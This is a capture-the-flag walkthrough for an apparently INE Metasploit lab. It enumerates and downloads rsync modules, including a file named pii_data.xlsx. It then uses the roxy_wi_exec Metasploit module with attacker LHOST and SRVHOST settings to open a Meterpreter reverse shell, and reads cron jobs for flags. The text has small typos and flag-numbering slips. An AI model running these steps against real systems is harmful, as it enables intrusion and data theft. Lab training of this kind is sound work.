## Host & Network Penetration Testing: The Metasploit Framework CTF 2


### Flag 1: Enumerate the open port using Metasploit, and inspect the RSYNC banner closely; it might reveal something interesting.

This task is quite straightforward. We need to launch Metasploit, Nmap tarte1.ine.local, and after verifying that the rsync port 873 is open, we attempt to connect to the service using the command:
```
rsync rsync://target1.ine.local/
```
to reveal the first flag.


### Flag 2: The files on the RSYNC server hold valuable information. Explore the contents to find the flag.

During the previous task, we discovered the flag associated with a rsync module named:
```
backupwscohen
```
We initiate a file download from the target folder using the rsync command.
```
rsync -av target1.ine.local::backupwscohen/
```
one of these files contains the flag.
```
cat pii_data.xlsx
```
### Flag 3: Try exploiting the webapp to gain a shell using Metasploit on target2.ine.local.

Upon exploring the target page using Firefox, we observe that the web server executes the command “Roxy-Wi”. This vulnerability can be easily identified using the Metasploit module:
```
exploit/linux/http/roxy_wi_exec
```
Configuring the module is straightforward.
```
SET SRVHOST [attacker_ip]
SET LHOST [attacker_ip]
SET RHOSTS [target_it]
run
```
Upon establishing a Meterpreter session and navigating to the root directory, we discovered the third flag.

### Flag 4: Automated tasks can sometimes leave clues. Investigate scheduled jobs or running processes to uncover the hidden flag.

Navigating to /etc/cron.d we find the third flag in the cronjob:
```
www-data-cron
```
